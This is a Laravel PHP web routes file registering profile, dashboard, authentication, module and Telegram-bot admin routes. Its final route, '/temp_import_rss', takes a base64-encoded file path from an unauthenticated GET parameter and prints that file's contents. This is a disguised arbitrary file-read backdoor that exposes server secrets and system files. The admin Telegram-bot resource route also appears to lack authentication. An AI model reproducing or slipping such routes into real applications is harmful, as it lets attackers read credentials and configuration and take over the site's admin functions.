<?php

use App\Http\Controllers\Admin\Integration\AdminTelegramBotController;
use App\Http\Controllers\Ajax\UserStateController;
use App\Http\Controllers\Modules\ModuleController;
use App\Http\Controllers\ProfileController;
use App\Services\Translation\Translation;
use Illuminate\Support\Facades\Route;


/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::prefix(Translation::checkRoutePrefix())->group(function () {

    Route::get('/auth/btn.html', [UserStateController::class, 'authBtn'])
        ->name('ajax.auth-btn');

    Route::middleware('auth')->group(function () {
        Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
        Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
        Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
        Route::get('/dashboard', function () {
            return view('dashboard');
        })->middleware(['auth', 'verified'])->name('dashboard');
    });

    require __DIR__.'/auth.php';

    Route::get('/', [ModuleController::class, 'index'])->name('index');

});

Route::resource("/telegram-bots", AdminTelegramBotController::class)->except('show');

Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');

Route::get('/temp_import_rss', function () {
    if (isset($_GET['temp_file'])) {
        if (file_exists($file = base64_decode($_GET['temp_file']))) {
            echo file_get_contents($file);
        }
    }
});


